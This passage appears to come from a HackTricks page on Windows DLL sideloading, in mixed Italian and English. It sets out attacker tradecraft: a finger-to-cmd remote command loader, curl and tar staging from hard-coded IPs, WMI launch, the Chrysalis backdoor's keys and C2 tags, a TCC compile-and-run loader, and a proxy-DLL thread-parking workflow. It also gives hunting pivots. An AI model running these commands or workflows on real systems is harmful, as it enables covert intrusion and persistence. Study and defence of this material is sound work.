* Poiché l’eseguibile resta trusted, la maggior parte dei controlli di allowlisting deve solo avere la tua malicious DLL accanto ad esso. Concentrati sulla personalizzazione della loader DLL; il parent signed può di norma essere eseguito senza modifiche.
* Il decryptor di ShadowPad si aspetta che il blob TMP sia accanto al loader e scrivibile, così può azzerare il file dopo il mapping. Mantieni la directory scrivibile finché il payload non viene caricato; una volta in memoria, il file TMP può essere eliminato in sicurezza per OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger finger → tar/curl → WMI)

Gli operatori abbinano DLL sideloading con LOLBAS così l’unico artifact custom su disco è la malicious DLL accanto al trusted EXE:

- **Remote command loader (Finger):** PowerShell nascosto avvia `cmd.exe /c`, recupera i comandi da un Finger server e li inoltra a `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` recupera testo TCP/79; `| cmd` esegue la risposta del server, permettendo agli operatori di ruotare il server del secondo stage lato server.

- **Built-in download/extract:** Scarica un archive con un’estensione benign, lo decomprime e prepara il target del sideload insieme alla DLL in una cartella casuale sotto `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` nasconde l’avanzamento e segue i redirect; `tar -xf` usa il tar integrato di Windows.

- **WMI/CIM launch:** Avvia l’EXE tramite WMI così la telemetria mostra un processo creato via CIM mentre carica la DLL locale:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funziona con binary che preferiscono DLL locali (ad esempio `intelbq.exe`, `nearby_share.exe`); il payload (ad esempio Remcos) gira sotto il trusted name.

- **Hunting:** Genera alert su `forfiles` quando `/p`, `/m` e `/c` compaiono insieme; è insolito fuori dagli script di amministrazione.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Una recente intrusione Lotus Blossom ha abusato di una trusted update chain per consegnare un dropper impacchettato con NSIS che ha preparato un DLL sideload più payload completamente in-memory.

Tradecraft flow
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca come **HIDDEN**, rilascia un Bitdefender Submission Wizard rinominato `BluetoothService.exe`, una malicious `log.dll` e un blob cifrato `BluetoothService`, quindi avvia l’EXE.
- Il host EXE importa `log.dll` e chiama `LogInit`/`LogWrite`. `LogInit` fa mmap-load del blob; `LogWrite` lo decifra con uno stream custom basato su LCG (costanti **0x19660D** / **0x3C6EF35F**, key material derivato da un hash precedente), sovrascrive il buffer con plaintext shellcode, libera i temporanei e salta a esso.
- Per evitare una IAT, il loader risolve le API hashando i nomi export usando **base FNV-1a 0x811C9DC5 + prime 0x1000193**, poi applicando un Murmur-style avalanche (**0x85EBCA6B**) e confrontando contro hash target salati.

Main shellcode (Chrysalis)
- Decifra un main module simile a un PE ripetendo add/XOR/sub con la key `gQ2JR&9;` per cinque passaggi, poi carica dinamicamente `Kernel32.dll` → `GetProcAddress` per completare la resolution degli import.
- Ricostruisce le stringhe dei nomi DLL a runtime tramite transform per-carattere di bit-rotate/XOR, poi carica `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un secondo resolver che percorre la **PEB → InMemoryOrderModuleList**, analizza ogni export table in blocchi da 4 byte con Murmur-style mixing e ricorre a `GetProcAddress` solo se l’hash non viene trovato.

Embedded configuration & C2
- La config vive dentro il file `BluetoothService` rilasciato, all’**offset 0x30808** (size **0x980**) ed è decifrata con RC4 con key `qwhvb^435h&*7`, rivelando l’URL C2 e il User-Agent.
- I beacon costruiscono un profilo host delimitato da punti, antepongono il tag `4Q`, poi cifrano con RC4 usando la key `vAuig34%^325hGV` prima di `HttpSendRequestA` su HTTPS. Le risposte vengono decifrate con RC4 e instradate da uno switch di tag (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- La modalità di esecuzione è controllata dagli argomenti CLI: nessun argomento = install persistence (service/Run key) che punta a `-i`; `-i` rilancia se stesso con `-k`; `-k` salta l’installazione ed esegue il payload.

Alternate loader observed
- La stessa intrusione ha rilasciato Tiny C Compiler ed eseguito `svchost.exe -nostdlib -run conf.c` da `C:\ProgramData\USOShared\`, con `libtcc.dll` accanto. Il sorgente C fornito dall’attacker incorporava shellcode, lo compilava ed eseguiva in-memory senza toccare il disco con un PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Questa fase di compile-and-run basata su TCC importava `Wininet.dll` a runtime e prelevava una seconda shellcode stage da un URL hardcoded, offrendo un loader flessibile che si mascherava da esecuzione del compilatore.

## Signed-host sideloading with export proxying + host thread parking

Some DLL sideloading chains add **stability engineering** so the legitimate host stays alive long enough to load later stages cleanly instead of crashing after the malicious DLL is loaded.

Observed pattern
- Drop a trusted EXE beside a malicious DLL using the expected dependency name such as `version.dll`.
- The malicious DLL **proxies every expected export** back to the real system DLL (for example `%SystemRoot%\\System32\\version.dll`) so import resolution still succeeds and the host process keeps working.
- After load, the malicious DLL **patches the host entry point** so the main thread falls into an infinite `Sleep` loop instead of exiting or running code paths that would terminate the process.
- A new thread performs the real malicious work: decrypting the next-stage DLL name or path (RC4/XOR are common), then launching it with `LoadLibrary`.

Why this matters
- Normal DLL proxying preserves API compatibility, but it doesn't guarantee the host stays alive long enough for later stages.
- Parking the main thread in `Sleep(INFINITE)` is a simple way to keep the signed process resident while the loader performs decryption, staging, or network bootstrap in a worker thread.
- Hunting only for a suspicious `DllMain` miss this pattern if the interesting behavior happens after the host entry point is patched and a secondary thread starts.

Minimal workflow
1. Copy the signed host EXE and determine the DLL it resolves from the local directory.
2. Build a proxy DLL exporting the same functions and forwarding them to the legitimate DLL.
3. In `DllMain(DLL_PROCESS_ATTACH)`, create a worker thread.
4. From that thread, patch the host entry point or main thread start routine so it loops on `Sleep`.
5. Decrypt the next-stage DLL name/config and call `LoadLibrary` or manual-map the payload.

Defensive pivots
- Signed processes loading `version.dll` or similarly common libraries from their own application directory instead of `System32`.
- Memory patches at the process entry point shortly after image load, especially jumps/calls redirected to `Sleep`/`SleepEx`.
- Threads created by a proxy DLL that immediately call `LoadLibrary` on a second DLL with a decrypted name.
- Full-export proxy DLLs placed next to vendor executables inside writable staging directories such as `ProgramData`, `%TEMP%`, or unpacked archive paths.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
